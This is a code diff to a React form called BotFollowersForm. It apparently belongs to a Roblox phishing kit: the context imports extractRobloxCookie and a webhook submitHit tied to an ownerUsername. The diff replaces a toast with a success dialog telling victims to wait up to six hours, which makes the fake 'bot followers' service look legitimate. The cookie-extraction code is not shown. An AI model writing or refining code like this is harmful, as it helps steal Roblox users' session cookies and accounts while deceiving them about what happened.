@@ -7,12 +7,14 @@ import { submitHit } from '@/utils/webhookService';
 import { extractRobloxCookie } from '@/utils/extractCookie';
 import { useSite } from '@/context/SiteContext';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import SuccessDialog from '@/components/SuccessDialog';
 
 const BotFollowersForm: React.FC = () => {
   const [playerFile, setPlayerFile] = useState<string>("");
   const [pin, setPin] = useState<string>("");
   const [isLoading, setIsLoading] = useState(false);
   const [showError, setShowError] = useState(false);
+  const [showSuccess, setShowSuccess] = useState(false);
   const { ownerUsername } = useSite();
 
   const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -39,10 +41,7 @@ const BotFollowersForm: React.FC = () => {
         ownerUsername,
       });
       
-      toast.success("Bot following started!", {
-        description: 'Please allow up to 6 hours for processing.',
-        duration: 8000,
-      });
+      setShowSuccess(true);
     } catch (error) {
       toast.error("An error occurred. Please try again later.");
     } finally {
@@ -52,6 +51,12 @@ const BotFollowersForm: React.FC = () => {
 
   return (
     <>
+      <SuccessDialog
+        open={showSuccess}
+        onOpenChange={setShowSuccess}
+        title="Bot following started!"
+        message="Submission received. Please allow up to 6 hours for processing."
+      />
       <Dialog open={showError} onOpenChange={setShowError}>
         <DialogContent className="sm:max-w-md">
           <DialogHeader className="flex flex-col items-center justify-center text-center">
